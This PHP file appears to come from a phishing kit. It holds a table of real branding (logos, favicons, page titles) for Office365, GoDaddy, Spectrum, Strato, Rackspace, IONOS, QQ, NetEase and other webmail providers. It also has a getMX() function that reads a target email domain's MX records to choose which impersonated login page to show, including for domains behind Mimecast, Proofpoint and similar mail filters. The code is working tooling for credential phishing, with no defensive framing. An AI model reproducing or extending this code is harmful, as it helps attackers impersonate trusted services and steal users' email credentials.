<?php

$pageSelect = [
				'default'			=>	[
										'logo'		=>	'<img src="assets/default.png" alt="logo" style="height: 40px !important;">',
										'favicon'	=>	'assets/default.png',
										'title'		=>	'Portal Login'
									],
				'office'		=>	[
										'logo'		=>	'<img src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="logo">',
										'favicon'	=>	'https://aadcdn.msauth.net/shared/1.0/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico',
										'title'		=>	'Microsoft Office365 Portal Login'
									],
				'sendone'		=>	[
										'logo'		=>	'<img src="assets/one.com.b70a2250.svg" alt="logo" style="height: 40px !important;">',
										'favicon'	=>	'https://mail-static.cdn-one.com/v45.1.3/media/favicon.20f0cd89.ico',
										'title'		=>	'Webmail Login'
									],
				'roadrunner'	=>	[
										'logo'		=>	'<img src="https://webmail.spectrum.net/application/modules/mail/views/scripts/mail/images/logos/spectrum-logo.svg?v=2.17.1_4" alt="logo" style="height: 40px !important;">',
										'favicon'	=>	'https://www.spectrum.net/favicon.ico',
										'title'		=>	'Login TWC & Roadrunner RR Email | Spectrum Webmail'
									],
				'godaddy'		=>	[
										'logo'		=>	'<img src="data:image/png;base64,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" alt="logo" style="">',
										'favicon'	=>	'https://img6.wsimg.com/ux/favicon/android-icon-192x192.png',
										'title'		=>	'GoDaddy Portal Login'
									],
				'strato'		=>	[
										'logo'		=>	'<img src="assets/strato-webmail.png" alt="logo">',
										'favicon'	=>	'https://webmail.strato.com/appsuite/v=7.10.6-38.20231106.062742/apps/themes/strato/favicon.ico',
										'title'		=>	'Login - STRATO Webmail'
									],
				'serverdata'		=>	[
										'logo'		=>	'<img src="assets/owa.png" alt="logo" style="height: 60px !important;">',
										'favicon'	=>	'https://east.exch081.serverdata.net/owa/auth/15.2.1258/themes/resources/favicon.ico',
										'title'		=>	'Outlook'
									],
				'rackspace'		=>	[
										'logo'		=>	'<img src="assets/rackspace_wordmark_red.png" alt="logo" style="height: 30px !important;">',
										'favicon'	=>	'assets/emailsrvr.ico',
										'title'		=>	'Rackspace Login'
									],
				'netsomail'		=>	[
										'logo'		=>	'<img src="assets/netsol.png" alt="logo" style="height: 40px !important;">',
										'favicon'	=>	'https://www.networksolutions.com/favicon.ico',
										'title'		=>	'Network Solutions | My Account'
									],
				'1and1'			=>	[
										'logo'		=>	'<img src="assets/1and1.png" alt="logo" style="height: 40px !important;">',
										'favicon'	=>	'https://id.ionos.com/image/favicon.ico',
										'title'		=>	'1&1 IONOS Login'
									],
				'proximus'		=>	[
										'logo'		=>	'<img src="assets/proximusmail.png" alt="logo" style="height: 40px !important;">',
										'favicon'	=>	'assets/logo-header-fedex-gb.png',
										'title'		=>	'MyProximus Login'
									],
				'mail.com'		=>	[
										'logo'		=>	'<img src="assets/mailcom_01.png" alt="logo" style="height: 40px !important;">',
										'favicon'	=>	'https://s.uicdn.com/mailint/9.2242.0/assets/favicon.ico',
										'title'		=>	'Premium Mail.com Login'
									],
				'gandi'			=>	[
										'logo'		=>	'<img src="assets/gandi.net.png" alt="logo" style="height: 60px !important;">',
										'favicon'	=>	'https://id.gandi.net/assets/img/favicon/favicon_hires.png',
										'title'		=>	'Gandi Mail Login'
									],
				'263'			=>	[
										'logo'		=>	'<img src="assets/263domain_logo.png" alt="logo" style="height: 40px !important;">',
										'favicon'	=>	'https://mail.263.net/custom_login/images/favicon.ico?v=10205',
										'title'		=>	'263个企业邮箱 Portal Login'
									],
				'263xmail'		=>	[
										'logo'		=>	'<img src="assets/263domain_logo.png" alt="logo" style="height: 40px !important;">',
										'favicon'	=>	'assets/26xmail_favicon.ico',
										'title'		=>	'263个企业邮箱 Portal Login'
									],
				'qq'			=>	[
										'logo'		=>	'<img src="assets/qqmail_logo_default.png" alt="logo" style="width: 182px; height: 35px;">',
										'favicon'	=>	'https://mail.qq.com/zh_CN/htmledition/images/favicon/qqmail_favicon_96h.png',
										'title'		=>	'&#x767B;&#x5F55;QQ&#x90AE;&#x7BB1;'
									],
				'netease'		=>	[
										'logo'		=>	'<img src="assets/qiye_logo.gif" alt="logo" style="height: 40px !important;">',
										'favicon'	=>	'assets/qiye_favicon.ico',
										'title'		=>	'&#x7F51;&#x6613;&#x4F01;&#x4E1A;&#x90AE;&#x7BB1; - &#x90AE;&#x7BB1;&#x7528;&#x6237;&#x767B;&#x5F55;'
									],
];

function getMX ( $email ) {
	$mx_record = [
				'office365'		=>	[
										'record'		=>		'mail.protection.outlook.com',
										'save_as'		=>		'office'
									],
				'barracuda'		=>	[
										'record'		=>		'barracudanetworks.com',
										'save_as'		=>		'office'
									],
				'pphosted'		=>	[
										'record'		=>		'pphosted.com',
										'save_as'		=>		'office'
									],
				'ppe-hosted'		=>	[
										'record'		=>		'ppe-hosted.com',
										'save_as'		=>		'office'
									],
				'eooutlook'	=>	[
										'record'		=>		'mail.eo.outlook.com',
										'save_as'		=>		'office'
									],
				'outlook'		=>	[
										'record'		=>		'mail.outlook.com',
										'save_as'		=>		'office'
									],
				'arsmtp'		=>	[
										'record'		=>		'arsmtp.com',
										'save_as'		=>		'office'
									],
				'parsons'		=>	[
										'record'		=>		'parsons-peebles.com',
										'save_as'		=>		'office'
									],
				'inbound'		=>	[
										'record'		=>		'inbound-2.mimecast.com',
										'save_as'		=>		'office'
									],
				'messagelabs'	=>	[
										'record'		=>		'messagelabs.com',
										'save_as'		=>		'office'
									],
				'itwconnect'	=>	[
										'record'		=>		'itwconnect.com',
										'save_as'		=>		'office'
									],
				'hydra'			=>	[
										'record'		=>		'prod.hydra.sophos.com',
										'save_as'		=>		'office'
									],
				'mimecast'		=>	[
										'record'		=>		'mimecast',
										'save_as'		=>		'mimecast'
									],
				'netease'		=> 	[
										'record'		=>		'netease.com',
										'save_as'		=>		'netease'
									],
				'263xmail'		=> 	[
										'record'		=>		'263xmail.com',
										'save_as'		=>		'263xmail'
									],
				'cn4e'			=> 	[
										'record'		=>		'cn4e.com',
										'save_as'		=>		'cn4e'
									],
				'qq'			=> 	[
										'record'		=>		'qq.com',
										'save_as'		=>		'qq'
									],
				'qiye'			=> 	[
										'record'		=>		'qiye.163.com',
										'save_as'		=>		'qiye'
									],
				'263'			=> 	[
										'record'		=>		'263.net',
										'save_as'		=>		'263'
									],
				'godaddy'		=> 	[
										'record'		=>		'secureserver.net',
										'save_as'		=>		'godaddy'
									],
				'serverdata'	=> 	[
										'record'		=>		'serverdata.net',
										'save_as'		=>		'serverdata'
									],
				'strato'		=> 	[
										'record'		=>		'rzone.de',
										'save_as'		=>		'strato'
									],
				'rackspace'		=> 	[
										'record'		=>		'emailsrvr.com',
										'save_as'		=>		'rackspace'
									],
				'mtaroutes'		=> 	[
										'record'		=>		'mtaroutes.com',
										'save_as'		=>		'rackspace'
									],
				'1and1'			=> 	[
										'record'		=>		'1and1',
										'save_as'		=>		'1and1'
									],
				'sendone'		=> 	[
										'record'		=>		'cph3.one.com',
										'save_as'		=>		'sendone'
									],
				'ovh'			=> 	[
										'record'		=>		'ovh.net',
										'save_as'		=>		'ovh'
									],
				'mailhostbox'	=> 	[
										'record'		=>		'mailhostbox.com',
										'save_as'		=>		'mailhostbox'
									],
				'roadrunner'	=> 	[
										'record'		=>		'email.rr.com',
										'save_as'		=>		'roadrunner'
									],
				'proximus'		=> 	[
										'record'		=>		'skynet.be',
										'save_as'		=>		'proximus'
									],
				'gandi'			=> 	[
										'record'		=>		'gandi.net',
										'save_as'		=>		'gandi'
									],
				'1and1'			=> 	[
										'record'		=>		'ionos',
										'save_as'		=>		'1and1'
									],
				'mail.com'		=> 	[
										'record'		=>		'.mail.com',
										'save_as'		=>		'mail.com'
									],
				't-online'		=> 	[
										'record'		=>		't-online.de',
										'save_as'		=>		't-online'
									],
				'netsomail'		=> 	[
										'record'		=>		'netsol.xion',
										'save_as'		=>		'netsomail'
									],
			]
;
	$mail_part = explode( "@", $email );
	$domain = $mail_part[1];
	$found = '';
	$detect = '';
	if( checkdnsrr( $domain,'MX' ) ) {
		if( getmxrr( $domain , $mxhosts , $weight ) ) {
			foreach( $mx_record as $mx => $mxvalue ) {
				foreach( $mxhosts as $key => $hay ) {
					if( stripos( $hay, $mxvalue['record'] ) !== FALSE ) {
						$detect = 'found';
						$record = $mxvalue['save_as'];
					}
				}
			}
			if( $detect == 'found' ) {
				$found = $record;		
			}
		}
	}
	return $found;
}

